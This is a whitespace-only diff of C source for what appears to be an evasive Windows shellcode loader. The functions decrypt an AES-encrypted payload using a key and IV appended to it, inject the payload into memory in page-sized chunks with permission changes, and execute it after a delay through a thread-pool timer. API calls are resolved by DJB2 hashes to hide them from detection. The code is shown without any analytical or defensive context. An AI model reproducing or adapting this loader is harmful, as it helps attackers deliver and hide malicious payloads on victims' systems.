@@ -15,11 +15,11 @@ extern NT_API g_Nt; // Defined in main.c
 BOOL FetchAesConfAndDecrypt(IN PBYTE pPayloadBuffer, IN OUT SIZE_T* sPayloadSize, OUT PBYTE* ppDecryptedPayload) {
 	
 	BOOL			bResult				= FALSE;
-	AES256_CBC_ctx	CtAesCtx			= { 0 };
-	BYTE			pAesKey	[KEY_SIZE]	= { 0 };
-	BYTE			pAesIv	[IV_SIZE]	= { 0 };
+	AES256_CBC_ctx		CtAesCtx			= { 0 };
+	BYTE			pAesKey	[KEY_SIZE]		= { 0 };
+	BYTE			pAesIv	[IV_SIZE]		= { 0 };
 	ULONG_PTR		uAesKeyPtr			= NULL,
-					uAesIvPtr			= NULL;
+				uAesIvPtr			= NULL;
 
 	uAesKeyPtr	= ((pPayloadBuffer + *sPayloadSize) - (KEY_SIZE + IV_SIZE));
 	uAesIvPtr	= ((pPayloadBuffer + *sPayloadSize) - IV_SIZE);
@@ -60,14 +60,14 @@ BOOL InjectEncryptedPayload(IN PBYTE pPayloadBuffer, IN SIZE_T sPayloadSize, OUT
 		return FALSE;
 	}
 
-	NTSTATUS	STATUS				=	0x00;
-	SIZE_T		sNewPayloadSize		=	SET_TO_MULTIPLE_OF_4096(sPayloadSize),	// rounded up payload size
-				sChunkSize			=	PAGE_SIZE;
-	DWORD		ii					=	sNewPayloadSize / PAGE_SIZE,			// number of iterations needed 
-				dwOldPermissions	=	0x00;
-	PVOID		pAddress			=	NULL,
-				pTmpAddress			=	NULL;
-	PBYTE		pTmpPayload			=	NULL;
+	NTSTATUS	STATUS			= 0x00;
+	SIZE_T		sNewPayloadSize		= SET_TO_MULTIPLE_OF_4096(sPayloadSize),	// rounded up payload size
+			sChunkSize		= PAGE_SIZE;
+	DWORD		ii			= sNewPayloadSize / PAGE_SIZE,			// number of iterations needed 
+			dwOldPermissions	= 0x00;
+	PVOID		pAddress		= NULL,
+			pTmpAddress		= NULL;
+	PBYTE		pTmpPayload		= NULL;
 
 	// If not initialized
 	if (!g_Nt.bInit)
@@ -93,7 +93,7 @@ BOOL InjectEncryptedPayload(IN PBYTE pPayloadBuffer, IN SIZE_T sPayloadSize, OUT
 
 	// Fixing up the base address and size to leave a RO page behind
 	sNewPayloadSize = sNewPayloadSize - PAGE_SIZE;
-	pAddress		= (PVOID)((ULONG_PTR)pAddress + PAGE_SIZE);
+	pAddress	= (PVOID)((ULONG_PTR)pAddress + PAGE_SIZE);
 
 #ifdef DEBUG
 	PRINT("\n");
@@ -167,16 +167,16 @@ https://learn.microsoft.com/en-us/windows/win32/procthread/using-the-thread-pool
 
 VOID ExecutePayload(IN PVOID pInjectedPayload) {
 
-	TP_CALLBACK_ENVIRON		tpCallbackEnv	= { 0 };
-	FILETIME				FileDueTime		= { 0 };
+	TP_CALLBACK_ENVIRON		tpCallbackEnv		= { 0 };
+	FILETIME			FileDueTime		= { 0 };
 	ULARGE_INTEGER			ulDueTime		= { 0 };
-	PTP_TIMER				ptpTimer		= NULL;
+	PTP_TIMER			ptpTimer		= NULL;
 
 	if (!pInjectedPayload)
 		return;
 
 	fnCreateThreadpoolTimer			pCreateThreadpoolTimer		= (fnCreateThreadpoolTimer)GetProcAddressH(GetModuleHandleH(kernel32dll_DJB2), CreateThreadpoolTimer_DJB2);
-	fnSetThreadpoolTimer			pSetThreadpoolTimer			= (fnSetThreadpoolTimer)GetProcAddressH(GetModuleHandleH(kernel32dll_DJB2), SetThreadpoolTimer_DJB2);
+	fnSetThreadpoolTimer			pSetThreadpoolTimer		= (fnSetThreadpoolTimer)GetProcAddressH(GetModuleHandleH(kernel32dll_DJB2), SetThreadpoolTimer_DJB2);
 	fnWaitForSingleObject			pWaitForSingleObject		= (fnWaitForSingleObject)GetProcAddressH(GetModuleHandleH(kernel32dll_DJB2), WaitForSingleObject_DJB2);
 
 	if (!pCreateThreadpoolTimer || !pSetThreadpoolTimer || !pWaitForSingleObject) {
@@ -197,7 +197,7 @@ VOID ExecutePayload(IN PVOID pInjectedPayload) {
 	}
 
 	// Set the timer to fire in PAYLOAD_EXEC_DELAY seconds.
-	ulDueTime.QuadPart			= (ULONGLONG)-(PAYLOAD_EXEC_DELAY * 10 * 1000 * 1000);
+	ulDueTime.QuadPart		= (ULONGLONG)-(PAYLOAD_EXEC_DELAY * 10 * 1000 * 1000);
 	FileDueTime.dwHighDateTime	= ulDueTime.HighPart;
 	FileDueTime.dwLowDateTime	= ulDueTime.LowPart;
 
